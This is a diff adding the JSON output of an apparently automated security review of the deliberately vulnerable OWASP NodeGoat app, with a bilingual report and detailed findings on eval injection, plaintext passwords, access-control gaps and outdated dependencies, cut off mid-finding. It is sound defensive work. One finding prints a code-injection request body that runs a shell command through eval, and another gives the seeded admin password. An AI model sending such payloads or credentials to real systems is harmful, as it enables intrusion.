@@ -1,0 +1,765 @@
+{
+  "type": "result",
+  "report": {
+    "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+    "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+    "outcome": "released",
+    "mergedRevision": "d9936acb74becdb1bcf318bf81f3e2542dc14ed8",
+    "goals": [
+      {
+        "key": "secrets",
+        "status": "merged",
+        "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-secrets",
+        "revision": "ab07eb7f66ec83ebc2e70d233d3183e5ebaaeed7",
+        "tree": "0b5f6fb8abc2f2ce4dbded6a07fbdf456d893148"
+      },
+      {
+        "key": "injection",
+        "status": "merged",
+        "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-injection",
+        "revision": "683e56d85a58bb9fa827bb46b96f00b4f9ddfc34",
+        "tree": "f134006b71bedbb4ebab836e18afeb656dcaeb49"
+      },
+      {
+        "key": "access",
+        "status": "merged",
+        "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-access",
+        "revision": "5810bef1061e74b4535fcf365ec7bbbff37a827e",
+        "tree": "ada70f7b760ba5bb635900f3917976983b7d7484"
+      },
+      {
+        "key": "data",
+        "status": "merged",
+        "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-data",
+        "revision": "f0cf406fec4e7c2465212bc129346caf01dc1d9d",
+        "tree": "c38f61f70388c8e67fc83591235559dc5a49ee13"
+      },
+      {
+        "key": "dependencies",
+        "status": "merged",
+        "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-dependencies",
+        "revision": "2b9d677085ac02010ef1d717b7d55102c7ce54b6",
+        "tree": "0f9c694bc9f42bd2a8fc22c7490226695cebdf60"
+      },
+      {
+        "key": "platform",
+        "status": "merged",
+        "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-platform",
+        "revision": "d2a3f28054a599aaf1f5b5321e4acbc23a9c3676",
+        "tree": "e469dd79e6c69289a706196de22c9f1c97ccc17a"
+      }
+    ]
+  },
+  "target": {
+    "root": "/home/user/targets/NodeGoat",
+    "files": 111,
+    "sha256": "78ac112b7bd5083bb065086c4642dcd8a3932a8d3052f9405503124c90a70fe3"
+  },
+  "elapsedSeconds": 1225,
+  "denials": [],
+  "deliverable": [
+    "REPORTING.md",
+    "SAFETY-REPORT.md",
+    "findings.json",
+    "findings/.gitkeep",
+    "findings/access.json",
+    "findings/data.json",
+    "findings/dependencies.json",
+    "findings/injection.json",
+    "findings/platform.json",
+    "findings/secrets.json",
+    "report/.gitkeep",
+    "report/access.md",
+    "report/data.md",
+    "report/dependencies.md",
+    "report/injection.md",
+    "report/platform.md",
+    "report/secrets.md",
+    "target.json",
+    "verify-safety-report.mjs"
+  ],
+  "safetyReport": "## Résumé exécutif\n\nCette revue de sécurité porte sur OWASP NodeGoat, une application Express.js/MongoDB\ndélibérément vulnérable, au sein de l'arborescence verrouillée\n`/home/user/targets/NodeGoat` (111 fichiers, sha256\n`78ac112b7bd5083bb065086c4642dcd8a3932a8d3052f9405503124c90a70fe3`). Six départements\nont lu le code (access, data, dependencies, injection, platform, secrets), chacun\noutillé par `semgrep 1.177.0` (règles locales du paquet plus `p/owasp-top-ten`) et,\npour le département dependencies, par `npm audit` contre le registre npm réel ; chaque\nsignal d'outil a servi de point de lecture, jamais de constat direct. L'intégration a\nfusionné les six fichiers `findings/<departement>.json`, dédupliqué par fichier + ligne\n+ CWE, et vérifié chaque constat retenu avec l'examinateur mécanique\n`verify-safety-report.mjs`, qui confirme que chaque `fichier:ligne` cité existe dans\nl'arbre verrouillé et que l'extrait cité correspond au texte réel. 38 constats sont\nretenus : 4 critiques, 16 hauts, 14 moyens, 4 faibles. Les trois plus importants : (1)\nune injection de code côté serveur via `eval()` sur les pourcentages de cotisation\n(`app/routes/contributions.js:32`), permettant l'exécution de JavaScript arbitraire\ndans le processus Node pour tout utilisateur authentifié ; (2) les mots de passe de\ntous les comptes sont stockés et comparés en clair, jamais hachés\n(`app/data/user-dao.js:25`) ; (3) le compte administrateur est initialisé avec un mot\nde passe en clair codé en dur (`artifacts/db-reset.js:18`) que le chemin de connexion\nréel accepte tel quel. Neuf constats en double (même fichier, même ligne, même CWE,\nrédigés indépendamment par deux départements) ont été fusionnés en un seul, l'entrée\nretenue étant listée sous « Ce qui n'a pas été couvert ». Cette revue est une lecture\nstatique par un modèle de langage, appuyée par un analyseur statique et par\nl'examinateur mécanique commité ; elle ne couvre ni le comportement d'exécution réel,\nni l'historique Git, ni l'intégralité de l'arbre de dépendances transitives.\n\n- critical: 4\n- high: 16\n- medium: 14\n- low: 4\n- info: 0\n\n## Executive summary\n\nThis review covers OWASP NodeGoat, a deliberately vulnerable Express.js/MongoDB\napplication, over the locked tree at `/home/user/targets/NodeGoat` (111 files, sha256\n`78ac112b7bd5083bb065086c4642dcd8a3932a8d3052f9405503124c90a70fe3`). Six departments\nread the code (access, data, dependencies, injection, platform, secrets), each using\n`semgrep 1.177.0` (the local department rule pack plus `p/owasp-top-ten`) and, for the\ndependencies department, `npm audit` against the live npm registry; every tool hit was\ntreated as a lead to read, never reported as a finding on its own strength. The\nintegration merged all six `findings/<department>.json` files, deduplicated by file +\nline + CWE, and verified every retained finding with the mechanical examiner\n`verify-safety-report.mjs`, which confirms every cited `file:line` exists in the locked\ntree and that the quoted snippet matches the real text. 38 findings are retained: 4\ncritical, 16 high, 14 medium, 4 low. The three most important: (1) server-side code\ninjection via `eval()` on submitted contribution percentages\n(`app/routes/contributions.js:32`), giving any authenticated user arbitrary JavaScript\nexecution inside the Node process; (2) every account's password is stored and compared\nin cleartext, never hashed (`app/data/user-dao.js:25`); (3) the admin account is seeded\nwith a hard-coded plaintext password (`artifacts/db-reset.js:18`) that the live login\npath accepts as-is. Nine duplicate findings (same file, line, and CWE, written\nindependently by two departments) were folded into one each; the id dropped from each\npair is listed under \"What was not covered\". This review is a static read by a\nlanguage model, grounded by a static analyzer and by the committed mechanical\nexaminer; it does not cover runtime behavior, git history, or the full transitive\ndependency tree.\n\n- critical: 4\n- high: 16\n- medium: 14\n- low: 4\n- info: 0\n\n## Scope and method\n\nTarget: `/home/user/targets/NodeGoat` (OWASP NodeGoat), the tree locked by\n`target.json` — 111 files, sha256\n`78ac112b7bd5083bb065086c4642dcd8a3932a8d3052f9405503124c90a70fe3` — read-only for\nevery department and for this integration. Six departments ran on this tree and each\ncommitted `findings/<department>.json` plus `report/<department>.md`: **access**\n(authentication, session, authorization — 8 raw findings), **data** (sensitive data\nexposure, crypto, logging — 7 raw findings), **dependencies** (manifest/lockfile\nadvisory audit — 11 raw findings), **injection** (SQLi/NoSQLi/eval/SSRF/XSS/redirect —\n6 raw findings), **platform** (security misconfiguration, headers, cookies, error\nhandling — 8 raw findings), **secrets** (hard-coded credentials and keys — 7 raw\nfindings). Tooling: `semgrep 1.177.0`, run by every department with the program's local\nrule pack plus the registry pack `p/owasp-top-ten` (both reachable), `--metrics off\n--json`, over the target tree — 113 rules across 72 git-tracked files, 29 raw hits per\nrun, each hit read as a lead and independently confirmed or discarded, never reported\non the strength of the pattern match alone. The dependencies department additionally\nran `npm audit --json` against `package-lock.json`'s resolved graph through the live\nnpm registry (145 advisory-flagged packages found) and `npm view <pkg> deprecated` /\n`npm view <pkg> time` to confirm two maintenance claims. This integration ran\n`node verify-safety-report.mjs --findings findings/<department>.json --list-invalid`\nfor every department (no id was refused) and `node verify-safety-report.mjs --report`\nagainst the merged output before committing.\n\nFiles actually read line-by-line across the six departments (the request-handling and\nconfiguration surface of the application): `server.js`; the full route table in\n`app/routes/index.js` and every handler under `app/routes/` (`allocations`, `benefits`,\n`contributions`, `error`, `memos`, `profile`, `research`, `session`, `tutorial`); every\nDAO under `app/data/` (`allocations`, `benefits`, `contributions`, `memos`, `profile`,\n`research`, `user`); the Swig templates `app/views/profile.html`, `app/views/memos.html`,\n`app/views/error-template.html`, `app/views/layout.html`, `app/views/dashboard.html`,\n`app/views/benefits.html`; `config/config.js` and every file in `config/env/`;\n`package.json` and `package-lock.json`; `artifacts/db-reset.js` and\n`artifacts/cert/server.key`; `docker-compose.yml`, `Dockerfile`, `app.json`, `Procfile`,\n`.dockerignore`, `nodemon.json`; `test/security/profile-test.js` and selected\n`test/e2e/` fixtures, for context only. This is a review by a language model, grounded\nby the semgrep static scanner and by the committed mechanical examiner\n`verify-safety-report.mjs`; it is not a dynamic test of a running instance, and it does\nnot establish what a real deployment's environment variables, reverse proxy, or WAF\nconfiguration are.\n\n## Findings\n\n### critical\n\n- `data-001-plaintext-password-storage` — User passwords are stored and compared in cleartext (`app/data/user-dao.js:25`, CWE-256, confirmed) — anyone reading the `users` collection gets every real password in plaintext; hash with bcrypt before insert and compare with a constant-time verify.\n- `dependencies-underscore-rce` — underscore resolves to 1.9.1, inside the range for a template-injection RCE and an unbounded-recursion DoS (`package.json:23`, CWE-94, confirmed) — upgrade to >=1.13.7.\n- `injection-eval-contributions-update` — Server-side code injection via `eval()` on contribution percentages (`app/routes/contributions.js:32`, CWE-95, confirmed) — any authenticated user gets arbitrary JavaScript execution in the server process; parse with `parseInt`/`parseFloat` instead.\n- `secrets-admin-password-plaintext` — Admin account seeded with a hard-coded plaintext password the live login path checks verbatim (`artifacts/db-reset.js:18`, CWE-798, confirmed) — never seed real-shaped credentials; generate a random admin password at first run.\n\n### high\n\n- `access-benefits-missing-admin-check` — Any authenticated user, not just an admin, can update another employee's benefits record (`app/routes/index.js:56`, CWE-862, confirmed) — re-attach the existing `isAdmin` middleware.\n- `access-idor-allocations` — Allocations page loads another user's data from a client-supplied `userId` with no ownership check (`app/routes/index.js:63`, CWE-639, confirmed) — key the query off `req.session.userId`, not the route parameter.\n- `access-login-no-rate-limit` — Login endpoint has no attempt limit, lockout, or delay (`app/routes/index.js:34`, CWE-307, confirmed) — add a per-account/per-IP rate limiter.\n- `data-002-plaintext-ssn-dob-bank-storage` — SSN, date of birth and bank account/routing numbers are persisted unencrypted (`app/data/profile-dao.js:61`, CWE-312, confirmed) — re-enable the existing (commented-out) encrypt/decrypt helpers.\n- `dependencies-body-parser-dos` — body-parser resolves to 1.18.3, matching two DoS advisories (`package.json:9`, CWE-405, confirmed) — upgrade to >=1.20.6.\n- `dependencies-express-redirect-and-transitive` — express resolves to 4.16.4 with its own redirect/XSS advisories and 6 vulnerable transitive packages (`package.json:13`, CWE-601, confirmed) — upgrade to >=4.21.2.\n- `dependencies-forever-transitive-critical` — forever resolves to 2.0.0 and pulls in a prototype-pollution advisory in nconf (`package.json:15`, CWE-1321, confirmed) — upgrade to >=4.0.3 or replace with a maintained supervisor.\n- `dependencies-marked-redos-xss` — marked is exact-pinned to 0.3.5 and carries six advisories: two XSS bypasses and four ReDoS (`package.json:17`, CWE-1333, confirmed) — upgrade to >=4.0.10.\n- `dependencies-mongodb-dos` — mongodb driver resolves to 2.2.36, inside a DoS advisory range, plus a vulnerable transitive bson (`package.json:18`, CWE-400, confirmed) — upgrade past 3.1.13, ideally to the current major.\n- `dependencies-swig-abandoned` — swig is pinned to its last-ever release, carries an unpatched arbitrary local file read, and is formally deprecated (`package.json:22`, CWE-22, confirmed) — no fixed version exists; replace with a maintained template engine.\n- `injection-nosql-where-allocations-threshold` — NoSQL injection in allocations lookup via unsanitized `$where` JavaScript (`app/data/allocations-dao.js:78`, CWE-943, confirmed) — replace with a structured query.\n- `injection-ssrf-research-symbol` — Server-side request forgery in stock research lookup (`app/routes/research.js:15`, CWE-918, confirmed) — do not accept a full destination URL from the client.\n- `injection-xss-memos-marked-stored` — Stored XSS in memos via unescaped markdown rendering shared with every user (`app/views/memos.html:31`, CWE-79, likely) — sanitize rendered markdown with a maintained HTML sanitizer and re-enable Swig autoescaping.\n- `platform-plaintext-http-only` — The server only ever listens over plain HTTP; the HTTPS setup is fully commented out (`server.js:145`, CWE-319, confirmed) — terminate TLS at the app or a reverse proxy.\n- `platform-session-cookie-insecure-flags` — Session cookie has no `httpOnly`, `secure`, `sameSite`, or expiry, and keeps the default cookie name (`server.js:78`, CWE-614, confirmed) — set a full `cookie:` options block once served over HTTPS.\n- `secrets-cookie-secret` — Express session secret is a hard-coded literal with no environment override (`config/env/all.js:8`, CWE-798, confirmed) — read from a required environment variable and rotate the committed value.\n\n### medium\n\n- `access-csrf-disabled-profile-update` — State-changing profile update (bank account/routing, SSN, DOB) has no CSRF protection (`app/routes/index.js:48`, CWE-352, confirmed) — re-enable `csurf` or an equivalent check.\n- `access-login-no-session-regeneration` — Session id is not regenerated after successful login, session fixation (`app/routes/session.js:116`, CWE-384, confirmed) — call `req.session.regenerate()` before assigning `req.session.userId`.\n- `access-non-constant-time-password-compare` — Login compares passwords with plain `===` instead of a constant-time verify (`app/data/user-dao.js:61`, CWE-916, confirmed) — verify hashes with `bcrypt.compareSync`.\n- `data-004-hardcoded-crypto-key` — AES encryption key for PII is a hard-coded literal (`config/env/all.js:9`, CWE-321, confirmed) — generate a random, deployment-specific key from a secret manager.\n- `data-007-seed-script-logs-plaintext-passwords` — Database seed script prints every account's plaintext password to the console (`artifacts/db-reset.js:99`, CWE-532, confirmed) — log only non-secret fields.\n- `dependencies-grunt-devtooling-rce` — grunt (build/dev tooling) resolves to 1.0.3, inside the range for an RCE advisory plus a race condition and path traversal (`package.json:45`, CWE-94, confirmed) — upgrade to >=1.6.1.\n- `dependencies-helmet-outdated-major` — helmet pinned to the 2.x line, whose bundled helmet-csp has a CSP-override advisory (`package.json:16`, CWE-693, likely) — upgrade to a current major and rewrite the config call.\n- `injection-open-redirect-learn` — Open redirect via unvalidated query parameter on `/learn` (`app/routes/index.js:72`, CWE-601, confirmed) — validate the target against an allowlist.\n- `injection-xss-profile-firstname-reflected` — Reflected XSS in profile form via unescaped `firstName` on validation failure (`app/views/profile.html:41`, CWE-79, confirmed) — re-enable Swig's default autoescaping.\n- `platform-error-handler-discloses-error` — Global error handler renders the raw `Error` object into the HTML response (`app/routes/error.js:10`, CWE-209, confirmed) — render a fixed generic message instead.\n- `platform-missing-security-headers` — helmet is installed but never mounted, so no security headers are set on any response (`server.js:10`, CWE-693, confirmed) — uncomment and mount `helmet()`.\n- `platform-node-env-default-development` — `NODE_ENV` silently defaults to `\"development\"` when unset, and the production config adds no hardening (`config/config.js:5`, CWE-1188, likely) — fail startup when unset.\n- `secrets-committed-rsa-private-key` — RSA private key committed at the exact path the (disabled) HTTPS setup loads (`artifacts/cert/server.key:1`, CWE-321, confirmed) — remove from source control, treat as compromised, reissue.\n- `secrets-config-logged-to-console` — Full configuration object, including the cookie secret and crypto key, is printed to stdout on every startup (`config/config.js:12`, CWE-532, confirmed) — never log a config object wholesale; redact secret fields.\n\n### low\n\n- `dependencies-csurf-deprecated` — csurf is archived and formally deprecated by its maintainers, with no forward-fix path (`package.json:11`, CWE-1104, confirmed) — migrate to a maintained CSRF package.\n- `dependencies-floating-devdeps` — Two devDependencies float on a mutable reference instead of a pinned version (`package.json:50`, CWE-829, confirmed) — pin to an explicit version or immutable commit.\n- `secrets-zap-api-key-development` — OWASP ZAP API key hard-coded in the committed development config (`config/env/development.js:6`, CWE-798, confirmed) — read from an environment variable with no default.\n- `secrets-zap-api-key-test` — OWASP ZAP API key hard-coded in the committed test config, duplicate of the development value (`config/env/test.js:6`, CWE-798, confirmed) — read from an environment variable with no default.\n\n## What was not covered\n\n**Findings dropped during deduplication.** Nine findings were written independently by\ntwo departments on the same `file:line:CWE` and were merged into one entry each; no\nfinding from `verify-safety-report.mjs --list-invalid` was refused (it printed no ids\nfor any of the six department files), so every drop below is a dedup fold, not an\nexaminer rejection:\n\n- `access-plaintext-password-storage` — duplicate of `data-001-plaintext-password-storage` (`app/data/user-dao.js:25`, CWE-256); the data department's `critical`-severity write-up was kept over the access department's `high`-severity one, both `confirmed`.\n- `data-003-hardcoded-cookie-secret` — duplicate of `secrets-cookie-secret` (`config/env/all.js:8`, CWE-798); both `high`/`confirmed`, the secrets department's entry was kept as the department that owns hard-coded-credential findings.\n- `secrets-dead-crypto-key` — duplicate of `data-004-hardcoded-crypto-key` (`config/env/all.js:9`, CWE-321); the data department's `medium`-severity write-up was kept over the secrets department's `low`-severity one, both `confirmed`.\n- `data-005-secrets-logged-at-startup` — duplicate of `secrets-config-logged-to-console` (`config/config.js:12`, CWE-532); both `medium`/`confirmed`, the secrets department's entry was kept.\n- `platform-verbose-config-log` — duplicate of `secrets-config-logged-to-console` (`config/config.js:12`, CWE-532); the secrets department's `medium`-severity write-up was kept over the platform department's `low`-severity one.\n- `data-006-cleartext-http-transport` — duplicate of `platform-plaintext-http-only` (`server.js:145`, CWE-319); both `high`/`confirmed`, the platform department's entry was kept as the department that owns transport configuration.\n- `access-session-cookie-not-secure-no-expiry` — duplicate of `platform-session-cookie-insecure-flags` (`server.js:78`, CWE-614); the platform department's `high`-severity write-up was kept over the access department's `medium`-severity one.\n- `platform-session-fixation-login` — duplicate of `access-login-no-session-regeneration` (`app/routes/session.js:116`, CWE-384); both `medium`/`confirmed`, the access department's entry was kept as the department that owns session-management findings.\n- `platform-no-rate-limit-login` — duplicate of `access-login-no-rate-limit` (`app/routes/index.js:34`, CWE-307); both `high`/`confirmed`, the access department's entry was kept as the department that owns authentication-throttling findings.\n\n**Departments and classes of defect not run at all.** No department reviewed\nmemory-safety bugs (buffer overflows, use-after-free): this codebase has no native\nmodule, so that class has no applicable target here, not a confirmed absence of risk.\nNo department ran a mobile-platform (Swift/Kotlin) review; NodeGoat has no mobile\nclient. No fuzzing, penetration testing, or dynamic scanning of a running instance was\nperformed by any department; every finding is a static read of the source in the\nlocked tree.\n\n**Checks that did not run.**\n- Git history was not scanned (no gitleaks/trufflehog run); a rotated secret could\n  still exist in an earlier commit the working tree does not show.\n- `node_modules` was never installed or inspected; the dependency audit ran against\n  `package-lock.json`'s resolved graph only, so no install-time script\n  (`postinstall`, etc.) was reviewed.\n- Only the direct dependency `grunt` was written up as a representative devDependency\n  finding; `cypress`, `mocha`, `selenium-webdriver`, `nodemon`, `jshint`,\n  `grunt-retire`, and `zaproxy` also carry `npm audit` advisories but were not each\n  turned into a separate finding, since they run only in build/CI/test, not the\n  deployed application.\n- Of the 145 packages `npm audit` flagged, only the ones matching a direct dependency\n  were written up; the remaining transitive packages (`qs`, `path-to-regexp`, `cookie`,\n  `send`, `serve-static`, `bson`, and others) are named only in prose under the direct\n  package that pulls them in, per the department's grouping rule.\n- Typosquatting was checked by visual read of the 34 direct dependency names, not by\n  an automated similarity comparison against a package-name database.\n- `marked` 0.3.5's own source was not read to confirm whether its `sanitize: true`\n  option resists every markdown-syntax XSS vector; `injection-xss-memos-marked-stored`\n  is marked `likely` for exactly this reason.\n- Runtime and deployment configuration — actual environment variables on a real\n  deployment, a reverse proxy adding TLS or headers, WAF/CDN rules — was not observed;\n  only the source defaults in this repository were read.\n- CI/CD workflow files (`.github/workflows/*.yml`, `.travis.yml`) and the\n  `Dockerfile`/`docker-compose.yml` supply chain were only skimmed by semgrep's\n  mutable-action-tag rule, not fully reviewed for build-time secrets or base-image\n  pinning.\n- Vendored front-end assets under `app/assets/vendor/**` (jQuery, Bootstrap, Raphael,\n  Morris, FontAwesome) were not reviewed as first-party code; they belong to the\n  dependency surface, not to this codebase's own logic.\n- SQL injection checks did not apply: NodeGoat's persistence layer is exclusively\n  MongoDB through the native driver, so no SQL-string-building code exists in the tree.\n- Command injection and path traversal were checked only by grepping for\n  `child_process`, `exec`/`execSync`/`spawn`, `fs.*`, and `sendFile`; every hit resolved\n  to a literal, non-request-derived path, so neither class was traced further.\n\n## Certificate\n\nVerified findings: 38\nTarget tree: 78ac112b7bd5083bb065086c4642dcd8a3932a8d3052f9405503124c90a70fe3\n\n`node verify-safety-report.mjs --report` mechanically checked that every finding in\n`findings.json` resolves to a real file and an existing line in the locked target tree\nand that its quoted snippet matches that line's actual text; that every finding id is\nunique; that no two findings share file, line, and CWE; that every id present in a\ndepartment's `findings/<department>.json` but absent from `findings.json` is disclosed\nabove; and that the severity counts stated in both summaries match `findings.json`\nexactly.\n\nThis review does not certify the absence of vulnerabilities; it certifies only that each listed finding was mechanically verified to exist at the cited line, over the files listed in \"Scope and method\".\n",
+  "findings": "[\n  {\n    \"id\": \"data-001-plaintext-password-storage\",\n    \"cwe\": \"CWE-256\",\n    \"owasp\": \"A02:2021 Cryptographic Failures\",\n    \"severity\": \"critical\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"User passwords are stored and compared in cleartext\",\n    \"file\": \"app/data/user-dao.js\",\n    \"line\": 25,\n    \"snippet\": \"password //received from request param\",\n    \"evidence\": \"addUser() builds the user document with the raw `password` parameter taken directly from the signup request body (app/routes/session.js handleSignup -> userDAO.addUser(userName, firstName, lastName, password, email, ...)) and inserts it unmodified via usersCol.insert(user, ...) at line 45. The bcrypt hashing call (`password: bcrypt.hashSync(password, bcrypt.genSaltSync())`) is present only inside the comment block at lines 26-30 and is never executed. validateLogin()'s comparePassword at line 61 (`return fromDB === fromUser;`) confirms the stored value is compared as plaintext, not through bcrypt.compareSync (also commented out at line 65). Every account's password is therefore held in the `users` collection exactly as submitted.\",\n    \"impact\": \"Anyone who can read the `users` collection - via a database backup, an administrator, or the NoSQL injection already reachable through the $where query in app/data/allocations-dao.js - obtains every user's real login password in plaintext, not a hash, enabling immediate account takeover on this application and on any other service where the same password is reused.\",\n    \"fix\": \"Hash passwords with bcrypt (or argon2id) before insert, e.g. `password: bcrypt.hashSync(password, bcrypt.genSaltSync(12))`, and compare with `bcrypt.compareSync(fromUser, fromDB)` in validateLogin instead of `===`.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/256.html\",\n      \"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\"\n    ]\n  },\n  {\n    \"id\": \"dependencies-underscore-rce\",\n    \"cwe\": \"CWE-94\",\n    \"owasp\": \"A06:2021 Vulnerable and Outdated Components\",\n    \"severity\": \"critical\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"underscore resolves to 1.9.1, inside the range for a template-injection RCE and an unbounded-recursion DoS\",\n    \"file\": \"package.json\",\n    \"line\": 23,\n    \"snippet\": \"\\\"underscore\\\": \\\"^1.8.3\\\"\",\n    \"evidence\": \"package.json declares underscore at ^1.8.3; package-lock.json resolves node_modules/underscore to 1.9.1. `npm audit --json` run in the target (registry reachable) maps this installed version to GHSA-cf4h-3jhx-xvhq (CVE-2021-23358, arbitrary code execution through underscore's `template` function when the template source or a variable name is attacker-influenced), whose vulnerable range is >=1.3.2 <1.12.1 and contains 1.9.1, and to GHSA-qpx9-hpmf-5gmw (unbounded recursion in `_.isEqual`/`_.flatten`, range <=1.13.7, also contains 1.9.1). Neither advisory required tracing this project's own call sites; both are matched on the resolved version directly.\",\n    \"impact\": \"Any code path in this app or its dependency graph that renders an underscore template with attacker-influenced content lets an attacker run arbitrary JavaScript in the Node process; a crafted object handed to the affected utility functions can also crash the process via stack exhaustion.\",\n    \"fix\": \"Upgrade underscore to >=1.13.7 (the declared ^1.8.3 range does not permit this; the manifest range itself must be raised), then re-run npm audit to confirm the range clears both advisories.\",\n    \"references\": [\n      \"GHSA-cf4h-3jhx-xvhq\",\n      \"CVE-2021-23358\",\n      \"GHSA-qpx9-hpmf-5gmw\"\n    ]\n  },\n  {\n    \"id\": \"injection-eval-contributions-update\",\n    \"cwe\": \"CWE-95\",\n    \"owasp\": \"A03:2021 Injection\",\n    \"severity\": \"critical\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"Server-side code injection via eval() on contribution percentages\",\n    \"file\": \"app/routes/contributions.js\",\n    \"line\": 32,\n    \"endLine\": 34,\n    \"snippet\": \"const preTax = eval(req.body.preTax);\\n        const afterTax = eval(req.body.afterTax);\\n        const roth = eval(req.body.roth);\",\n    \"evidence\": \"POST /contributions is routed in app/routes/index.js:52 to contributionsHandler.handleContributionsUpdate (isLoggedIn is the only guard, so any authenticated user reaches it). Inside that handler, app/routes/contributions.js:32-34 pass req.body.preTax, req.body.afterTax and req.body.roth directly into eval() with no validation beforehand; the isNaN/range checks at line 47 run only after the eval has already executed. Any of the three body fields is attacker-controlled JavaScript source that the server evaluates in its own process.\",\n    \"impact\": \"An authenticated attacker can submit a body such as {\\\"preTax\\\":\\\"require('child_process').execSync('id')\\\"} and have arbitrary JavaScript run inside the Node.js server process, leading to full remote code execution with the privileges of the application.\",\n    \"fix\": \"Never eval() request data; parse the numeric fields with parseInt/parseFloat (the commented-out fix directly below the vulnerable lines already does this) and validate the result before use.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/95.html\",\n      \"https://owasp.org/Top10/A03_2021-Injection/\"\n    ]\n  },\n  {\n    \"id\": \"secrets-admin-password-plaintext\",\n    \"cwe\": \"CWE-798\",\n    \"owasp\": \"A07:2021 Identification and Authentication Failures\",\n    \"severity\": \"critical\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"Admin account is seeded with a hard-coded plaintext password that the running login path checks verbatim\",\n    \"file\": \"artifacts/db-reset.js\",\n    \"line\": 18,\n    \"snippet\": \"        \\\"password\\\": \\\"Admin_123\\\",\",\n    \"evidence\": \"artifacts/db-reset.js builds USERS_TO_INSERT with the admin user's password as the plaintext literal \\\"Admin_123\\\" (the bcrypt-hashed alternative on line 19 is commented out) and inserts it as-is via usersCol.insertMany at line 101. This script is wired into the actual deployment path: docker-compose.yml:9 runs `node artifacts/db-reset.js` before `npm start` in the web container's command, and app.json:13 runs the identical script as the Heroku `postdeploy` hook. At login, app/data/user-dao.js:60-61 compares passwords with `const comparePassword = (fromDB, fromUser) => fromDB === fromUser;` — a direct plaintext equality check, no hashing — so \\\"Admin_123\\\" is a live, working credential for the isAdmin=true account on any deployment that ran the default reset/seed step and never changed it.\",\n    \"impact\": \"Anyone who reads this public repository has the admin username (\\\"admin\\\") and password (\\\"Admin_123\\\") for any NodeGoat instance that used the shipped seed script and default login logic, giving full admin access to the /benefits route and every other authenticated function in the app.\",\n    \"fix\": \"Never seed real or default-shaped credentials in source; generate a random admin password at first-run time and force a change, and store password hashes only (bcrypt.hashSync, already present but commented out in user-dao.js) — never compare passwords with plaintext equality.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/798.html\",\n      \"https://cwe.mitre.org/data/definitions/259.html\",\n      \"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\"\n    ]\n  },\n  {\n    \"id\": \"access-benefits-missing-admin-check\",\n    \"cwe\": \"CWE-862\",\n    \"owasp\": \"A01:2021 Broken Access Control\",\n    \"severity\": \"high\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"Any authenticated user, not just an admin, can update another employee's benefits record\",\n    \"file\": \"app/routes/index.js\",\n    \"line\": 56,\n    \"snippet\": \"app.post(\\\"/benefits\\\", isLoggedIn, benefitsHandler.updateBenefits);\",\n    \"evidence\": \"The middleware chain in front of this route is `isLoggedIn` only. `isAdmin` (`sessionHandler.isAdminUserMiddleware`, aliased at index.js:27 from app/routes/session.js:25-34) exists and checks `user.isAdmin` in the database, but it is never attached to this route: the commented-out block at index.js:57-60 shows it was the intended fix (`app.post(\\\"/benefits\\\", isLoggedIn, isAdmin, benefitsHandler.updateBenefits);`) and was disabled. The handler, app/routes/benefits.js:29-34, takes `userId` and `benefitStartDate` directly from `req.body` with no comparison to `req.session.userId` and no role check of its own, then calls `benefitsDAO.updateBenefits(userId, benefitStartDate, ...)`. app/data/benefits-dao.js:23-30 runs `usersCol.update({ _id: parseInt(userId) }, { $set: { benefitStartDate: startDate } }, ...)` on whatever id was supplied — an unrestricted write. The sibling GET route at index.js:55 has the same missing `isAdmin` check and lets any logged-in user list every non-admin employee's benefit data via `benefitsDAO.getAllNonAdminUsers` (app/data/benefits-dao.js:15-21).\",\n    \"impact\": \"A regular employee account can rewrite any other employee's benefitStartDate (an HR/admin-only action) and can list every employee's benefits record, by simply calling the route directly instead of using the UI, which only shows this page to admins.\",\n    \"fix\": \"Add the existing `isAdmin` middleware to both `app.get(\\\"/benefits\\\", ...)` and `app.post(\\\"/benefits\\\", ...)` as the commented-out code at index.js:57-60 already specifies, and re-check the role server-side rather than relying on the UI to hide the page.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/862.html\",\n      \"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\"\n    ]\n  },\n  {\n    \"id\": \"access-idor-allocations\",\n    \"cwe\": \"CWE-639\",\n    \"owasp\": \"A01:2021 Broken Access Control\",\n    \"severity\": \"high\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"Allocations page loads another user's data from a client-supplied userId with no ownership check\",\n    \"file\": \"app/routes/index.js\",\n    \"line\": 63,\n    \"snippet\": \"app.get(\\\"/allocations/:userId\\\", isLoggedIn, allocationsHandler.displayAllocations);\",\n    \"evidence\": \"The middleware chain in front of this route is only `isLoggedIn` (app/routes/index.js:24, defined in app/routes/session.js:36-42), which checks `req.session.userId` is truthy but never compares it to the requested resource. The handler itself, app/routes/allocations.js:16-18, reads `const { userId } = req.params;` (the commented-out lines 12-15 show the intended fix of taking it from `req.session` instead) and passes that raw value straight to `allocationsDAO.getByUserIdAndThreshold(userId, ...)` at line 23 with no comparison against `req.session.userId` anywhere in the handler. Any authenticated user can therefore browse `/allocations/<any-id>` and read another employee's stock/fund/bond allocation.\",\n    \"impact\": \"Any logged-in, non-admin user can enumerate userIds and read every other employee's financial allocation data — a full horizontal privilege escalation over that data set.\",\n    \"fix\": \"Ignore the `:userId` route parameter for authorization purposes; load `req.session.userId` server-side (as the commented-out code already suggests) and use 